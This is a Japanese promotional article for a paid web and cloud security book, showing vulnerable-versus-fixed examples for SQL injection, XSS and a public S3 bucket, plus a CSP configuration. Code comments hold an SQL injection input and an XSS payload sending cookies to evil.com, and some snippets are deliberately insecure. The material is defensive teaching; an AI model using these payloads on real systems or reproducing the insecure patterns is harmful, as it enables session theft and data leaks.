---
title: "【2026年版】セキュリティ完全ガイドを公開しました"
emoji: "🛡️"
type: "tech"
topics: ["security", "web", "aws", "cloud", "owasp"]
published: true
---

# セキュリティ完全ガイド 2026 を公開しました

## あなたのアプリ、攻撃されたらどうなりますか？

「うちは小規模だから大丈夫」
「フレームワークが守ってくれるでしょ」
「セキュリティは後で考える」
「何から手をつけていいかわからない」

こう思っていませんか？

現実はこうです：

- **データ漏洩1件あたりの平均被害額：488万ドル**（IBM 2024年調査）
- **Webアプリの94%に何らかの脆弱性が存在**（OWASP調査）
- **ランサムウェア攻撃：前年比70%増加**
- **サプライチェーン攻撃：過去3年で742%増加**（Sonatype調査）

攻撃者はツールを使って自動的にスキャンしています。「うちは狙われない」は通用しません。

そこで、**脅威モデリングからクラウド防御まで、セキュリティの全領域を体系的にまとめた完全ガイド**を執筆しました。

https://zenn.dev/gaku/books/security-complete-guide-2026

## こんなコード、書いていませんか？

本書で扱う内容から、現場でよく見かける危険なパターンを3つ紹介します。

### 危険パターン1: SQLインジェクションが可能なコード

**❌ 危険なコード：**

```python
# ユーザー入力をそのままSQLに埋め込み
def search_users(query):
    sql = f"SELECT * FROM users WHERE name LIKE '%{query}%'"
    cursor.execute(sql)
    return cursor.fetchall()

# 攻撃者の入力: ' OR '1'='1' --
# → 全ユーザーの情報が漏洩
```

**何が起きる？**
- 全テーブルのデータが流出する
- データの改ざん・削除が可能になる
- 最悪の場合、OSコマンドの実行まで可能

**✅ 安全なコード：**

```python
# パラメータ化クエリで攻撃を防止
def search_users(query):
    sql = "SELECT * FROM users WHERE name LIKE ?"
    cursor.execute(sql, (f"%{query}%",))
    return cursor.fetchall()

# 攻撃者の入力はただの文字列として処理される
```

**たった1行の違いで、データ漏洩を防げます。** 本書の第7章では、SQL・NoSQL・コマンド・テンプレートインジェクションの全パターンと対策を解説しています。

### 危険パターン2: XSSを許すフロントエンド

**❌ 危険なコード：**

```javascript
// ユーザーの入力をそのままHTMLに挿入
const comment = getUserInput();
document.getElementById("comments").innerHTML = comment;

// 攻撃者の入力: <script>document.location='https://evil.com/?cookie='+document.cookie</script>
// → 他のユーザーのCookieが盗まれる
```

**何が起きる？**
- セッションハイジャック（ログイン乗っ取り）
- フィッシングページへの誘導
- キーロガーの埋め込み

**✅ 安全なコード：**

```javascript
// textContentを使えばHTMLとして解釈されない
const comment = getUserInput();
document.getElementById("comments").textContent = comment;

// さらにCSPヘッダーで多層防御
// Content-Security-Policy: default-src 'self'; script-src 'self'
```

本書の第5章では、Reflected・Stored・DOM-basedの3種類のXSSと、コンテキスト別のエスケープ手法を詳しく解説しています。

### 危険パターン3: AWSの設定ミス

**❌ 危険な設定：**

```hcl
# S3バケットがパブリックアクセス可能
resource "aws_s3_bucket" "data" {
  bucket = "my-app-user-data"
}

# パブリックアクセスブロックの設定なし
# → 世界中から顧客データにアクセス可能
```

**何が起きる？**
- 顧客の個人情報が全世界に公開される
- クラウドストレージの設定ミスによる情報漏洩は毎月のように報道されている
- GDPRやPCI DSSの違反で多額の罰金

**✅ 安全な設定：**

```hcl
resource "aws_s3_bucket" "data" {
  bucket = "my-app-user-data"
}

resource "aws_s3_bucket_public_access_block" "data" {
  bucket = aws_s3_bucket.data.id

  block_public_acls       = true
  block_public_policy     = true
  ignore_public_acls      = true
  restrict_public_buckets = true
}

resource "aws_s3_bucket_server_side_encryption_configuration" "data" {
  bucket = aws_s3_bucket.data.id

  rule {
    apply_server_side_encryption_by_default {
      sse_algorithm = "aws:kms"
    }
  }
}
```

本書の第20章ではGuardDuty、Security Hub、CloudTrail、WAFなど、AWSのセキュリティサービス群を実践的に解説しています。

## この本で何が学べるのか

全25章、7つのパートで構成しています。

### Part 1: セキュリティの基礎（第1-3章）

CIA三原則、脅威モデリング、セキュリティ設計原則。ここを飛ばすと、後の章で「なぜこの対策が必要なのか」がわからなくなります。

### Part 2: Webセキュリティ（第4-8章）

**OWASP Top 10（2025年版対応）**、XSS、CSRF、SQLインジェクション、認証の脆弱性。Web開発者が最初に押さえるべき領域です。

### Part 3: 暗号技術（第9-11章）

AES-GCM、TLS 1.3、鍵管理。「暗号は難しい」と敬遠していた方も、実装例付きで理解できます。

### Part 4: ネットワークセキュリティ（第12-14章）

ファイアウォール、DNSセキュリティ、APIセキュリティ。OAuth 2.0 / JWTの正しい実装も解説。

### Part 5: アプリケーションセキュリティ（第15-18章）

セキュアコーディング、依存関係管理、コンテナセキュリティ、SAST/DAST。CI/CDに組み込むセキュリティテストの実践。

### Part 6: クラウドセキュリティ（第19-21章）

責任共有モデル、AWSセキュリティサービス群、IaCセキュリティ。クラウドネイティブ時代の防御戦略。

### Part 7: 運用とガバナンス（第22-25章）

インシデント対応、監視・ログ、コンプライアンス（GDPR/PCI DSS/SOC 2）、セキュリティ文化の構築。技術だけでなく組織を守る。

## 本書の内容を一部公開：CSPヘッダーの設定

XSS対策で最も効果的な多層防御のひとつ、**Content Security Policy（CSP）** の設定例を紹介します。

### なぜCSPが必要か

CSPは「このページで実行していいスクリプトのソース」をブラウザに宣言する仕組みです。たとえ攻撃者がHTMLにスクリプトを注入できても、CSPが許可していないスクリプトはブラウザが実行を拒否します。

### Nginx での設定例

```nginx
server {
    listen 443 ssl;
    http2 on;

    # CSP: 自サイトのスクリプトのみ許可、インラインスクリプト禁止
    add_header Content-Security-Policy "
        default-src 'self';
        script-src 'self' https://cdn.example.com;
        style-src 'self' 'unsafe-inline';
        img-src 'self' data: https:;
        font-src 'self' https://fonts.gstatic.com;
        connect-src 'self' https://api.example.com;
        frame-ancestors 'none';
        base-uri 'self';
        form-action 'self';
    " always;

    # その他のセキュリティヘッダー
    add_header X-Content-Type-Options "nosniff" always;
    add_header X-Frame-Options "DENY" always;
    add_header Referrer-Policy "strict-origin-when-cross-origin" always;
    add_header Permissions-Policy "camera=(), microphone=(), geolocation=()" always;
}
```

### 段階的な導入が重要

いきなり厳格なCSPを設定すると、既存の機能が動かなくなります。本書では以下の段階的アプローチを解説しています：

1. **Report-Only モード**で現状を把握する
2. **レポートを分析**して必要なソースを特定する
3. **段階的に制限を強化**する
4. **本番適用**して継続的にモニタリング

詳しくは第5章「XSS対策」で解説しています。

## 本書の特徴

### 1. 攻撃と防御をセットで解説

「何を守るか」だけでなく「攻撃者はどう攻めるか」を理解することで、本質的な対策ができるようになります。WAFバイパス手法を知っているからこそ「WAFだけでは不十分」と判断できます。

### 2. コード例が豊富

全25章で合計約400個のコードブロックを掲載。Python、JavaScript、Terraform、YAML、Dockerfileなど、現場で使う技術スタックに対応しています。

### 3. OWASP Top 10（2025年版）対応

2025年にリリースされた最新のOWASP Top 10に対応。ソフトウェアサプライチェーンの欠陥（A03:2025）や例外処理の不備（A10:2025）など、新しいカテゴリもカバーしています。

### 4. 理論から実務まで一気通貫

「CIA三原則とは」から始まり、「AWSのGuardDutyをTerraformで有効化する」コードまで、抽象から具体まで一冊で完結します。

## 全25章の目次

| # | 章タイトル | 主な内容 |
|---|---|---|
| 1 | セキュリティ概論 | CIA三原則、脅威ランドスケープ、リスク評価 |
| 2 | 脅威モデリング | STRIDE、アタックツリー、データフロー図 |
| 3 | セキュリティ設計原則 | 最小権限、多層防御、ゼロトラスト |
| 4 | OWASP Top 10 | 2025年版の全10カテゴリ概観 |
| 5 | XSS対策 | Reflected/Stored/DOM-based、CSP |
| 6 | CSRF・クリックジャッキング | SameSite Cookie、トークン方式 |
| 7 | インジェクション | SQL/NoSQL/コマンド/テンプレート |
| 8 | 認証の脆弱性 | セッション管理、MFA、OAuth |
| 9 | 暗号技術の基礎 | AES-GCM、RSA、楕円曲線、PQC |
| 10 | TLS・証明書 | TLS 1.3、証明書管理、mTLS |
| 11 | 鍵管理 | KMS、エンベロープ暗号化、ローテーション |
| 12 | ネットワークセキュリティ | ファイアウォール、IDS/IPS、VPN |
| 13 | DNSセキュリティ | DNSSEC、DNS over HTTPS |
| 14 | APIセキュリティ | OAuth 2.0、JWT、レートリミット |
| 15 | セキュアコーディング | 入力検証、出力エンコード、エラー処理 |
| 16 | 依存関係セキュリティ | SCA、Dependabot、SBOM |
| 17 | コンテナセキュリティ | Dockerfile、イメージスキャン、K8s |
| 18 | SAST・DAST | 静的/動的解析、CI/CD統合 |
| 19 | クラウドセキュリティ基礎 | 責任共有モデル、IAM、VPC |
| 20 | AWSセキュリティ | GuardDuty、Security Hub、WAF |
| 21 | IaCセキュリティ | Terraform/CloudFormation、OPA |
| 22 | インシデント対応 | 対応フロー、プレイブック、事後分析 |
| 23 | 監視・ログ | SIEM、異常検知、ダッシュボード |
| 24 | コンプライアンス | GDPR、PCI DSS、SOC 2 |
| 25 | セキュリティ文化 | DevSecOps、チャンピオン制度、教育 |

## こんな方におすすめ

- **Webアプリ開発者** — 自分が書いたコードの脆弱性を自分で発見・修正したい
- **インフラエンジニア・SRE** — クラウド環境のセキュリティ設計を体系的に学びたい
- **セキュリティ初学者** — 何から始めればいいかわからない。基礎から順に学びたい
- **テックリード** — チームにセキュリティ意識を根付かせたい。輪読会の教材を探している

## 価格

**1,000円**

108万字、全25章。1章あたり40円。ランチ1回分の投資で、セキュリティの全体像が手に入ります。

## さいごに

セキュリティは「やられてから対策する」では遅すぎます。

データ漏洩が起きてからでは、失った信頼は簡単には戻りません。攻撃者は24時間365日、自動化されたツールでスキャンし続けています。

この本が、**あなたのアプリケーションとユーザーを守る第一歩**になれば幸いです。

ご質問やフィードバックがあれば、ぜひコメント欄でお聞かせください。

---

**関連リンク**

- [本書の詳細・購入はこちら](https://zenn.dev/gaku/books/security-complete-guide-2026)
